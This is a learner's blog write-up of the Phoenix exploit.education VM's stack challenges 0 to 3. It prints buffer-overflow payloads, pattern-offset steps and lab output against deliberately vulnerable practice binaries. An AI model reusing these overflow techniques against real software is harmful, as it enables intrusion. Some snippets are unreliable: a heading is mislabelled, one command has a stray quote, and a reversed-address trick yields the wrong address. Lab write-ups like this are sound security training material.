---
title: "Phoenix"
date: 2020-03-23T11:24:34-04:00
draft: false
description: "Adventures in Learning ROP (Return Oriented Programming) | Using Exploit-Exercises Phoenix VM Image"
---

**Description:** 

The Phoenix VM Image can be found here:  https://exploit.education/phoenix/

The virtual machine containers a number of vulnerable executables that allow students to learn stack, format-string, and heap-based overflows. The stack series contains executables stack 0-6. Format string vulnerabilities include format 0-4, and the heap vulnerabilitites include heap 0-3.  

# Stack 0

Running ./stack-zero provides us with a place to enter some data. Entering a random sequence "AAAA" gives us the output:  ```Uh oh, 'changeme' has not yet been changed. Would you like to try again?```

Trying to send the program even more data (since this is a BoF lab) results in a successful completion of the challenge. 
```
python -c 'print "A" * 100' | ./stack-zero

Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```


# Stack 1  

```bash
pattern_create.rb -l 100
```  

```bash
./stack-one Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A  
```

>Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x63413163, we want 0x496c5962


```bash
pattern_offset -l 0x63413163

[*] Exact match at offset 64  
```  

Since we know there is a buffer size of 64 before we write to the changeme address space, we can write 64 bytes of garbage, followed by the intended value to store, written in little-endian so that it can be properly stored in memory. 

```bash
python -c 'print "A" * 64 + "\x62\x59\x6c\x49"'
```



The above will print 64 A's followed by the little-endian address.  

We can pass this to the stack-one executable as such:  


__python__
```bash
./stack-one $($python -c 'print "A" * 64" + "\x62\x59\x6c\x49"')
```
>Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value  


__python3__
```bash
./stack-one $(python3 -c 'print("A"*64 + "\x62\x59\x6c\x49")')
```

>Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value



# Stack 2

First running ./stack-two tells us to set the ExploitEducation environment variable.

$ export ExploitEducation="test"
./stack-two

> Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a

Bummer it looks the program is reading from the environment variable and that is where we can overflow the buffer
to set the changeme value that we need to pass the challenge.

__python 2__
```bash
export ExploitEducation=$(python -c 'print "A" * 64 + "\x0a\x09\x0a\x0d"')
```

__python3__
```bash
export ExploitEducation=$(python3 -c 'print("A"*64+"\x0a\x09\x0a\x0d")')
```

As python scripts:

__python2__
```python
#!/usr/bin/python

import os

#0x0d0a090a
#os.environ["ExploitEducation"] = "$(python3 -c 'print(\"A\" * 64 + \"\\x0a\\x09\\x0a\\x0d\")')"

os.system("ExploitEducation=$(python -c 'print \"A\"*64 + \"\\x0a\\x09\\x0a\\x0d\"') /opt/phoenix/amd64/stack-two")
```

__python3__
```python
#!/usr/bin/python3
import os

os.system("ExploitEducation=$(python3 -c 'print(\"A\"*64 + \"\\x0a\\x09\\x0a\\x0d\")') /opt/phoenix/amd64/stack-two")
```


# Stack 2

```bash
obj -d stack-three
```
We notice a function called "complete_challenge" located at address: 0x08048535, lets see if we can call
that function with a BoF. 

```bash
pattern_create -l 200
```

echo "$(pattern_create -l 200)" | ./stack-three
>exact match at 64

So we know our buffer is 64 bytes long before we overwrite EIP. 

```bash
python -c 'print "A"*64 + "\x35\x85\x04\x08"' | ./stack-three
```

The amd64 implementation of this is almost exactly the same except the memory address passed in EIP is only
3 bytes long, I have to research why that is the fact. 

An alternative to writing these exploits in little endian, is to use a little-known string reversal function
provided in python:

myString="hello"
myString[::-1]
>'olleh'

```bash
python -c 'print "A"*64 + "\x08\x08\x85\x35"[::-1]' | ./stack-three
```








